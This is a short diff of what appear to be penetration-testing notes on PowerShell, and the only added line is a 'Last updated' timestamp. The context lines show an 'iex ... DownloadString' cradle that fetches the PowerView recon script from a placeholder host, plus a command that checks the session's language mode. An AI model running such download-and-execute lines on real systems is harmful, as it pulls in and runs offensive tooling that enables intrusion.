@@ -162,3 +162,6 @@ iex (New-Ojbect Net.webClient).DownloadString('https://server.com/powerview.ps1'
 # Check current powershell session language mode
 $ExecutionContext.SessionState.LanguageMode
 ```
+
+
+Last updated: `$= dv.current().file.mtime.toFormat("MMMM dd, yyyy 'at' HH:mm")`
